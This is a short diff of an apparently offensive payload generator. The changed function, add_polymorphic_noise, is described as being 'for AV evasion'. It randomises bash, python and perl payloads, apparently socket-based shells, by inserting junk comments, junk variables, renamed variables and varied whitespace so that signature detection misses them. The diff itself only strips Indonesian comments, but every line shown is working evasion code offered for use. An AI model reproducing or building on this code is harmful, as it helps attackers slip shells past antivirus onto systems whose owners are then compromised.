@@ -24,20 +24,20 @@ PAYLOAD_TEMPLATES = {
 def add_polymorphic_noise(payload, payload_type):
     """Add random noise for AV evasion."""
     if payload_type.startswith("bash"):
-        # Random comment dan whitespace
+        
         comment = f"# {''.join(random.choices(string.ascii_letters, k=10))}\n"
         payload = comment + payload.replace(" ", random.choice([" ", "  ", "\t"]))
     elif payload_type.startswith("python"):
-        # Junk variable dan random var name
+       
         junk_var = ''.join(random.choices(string.ascii_letters, k=6))
         junk_val = random.randint(100, 9999)
         payload = f"{junk_var}={junk_val};{payload}"
-        # Ganti var name
+      
         old_var = payload.split("socket();")[0].split("=")[-1].strip()
         new_var = ''.join(random.choices(string.ascii_letters, k=4))
         payload = payload.replace(old_var, new_var)
     elif payload_type.startswith("perl"):
-        # Tambah whitespace acak
+        
         payload = payload.replace(";", f";{random.choice([' ', '  '])}")
     return payload
 
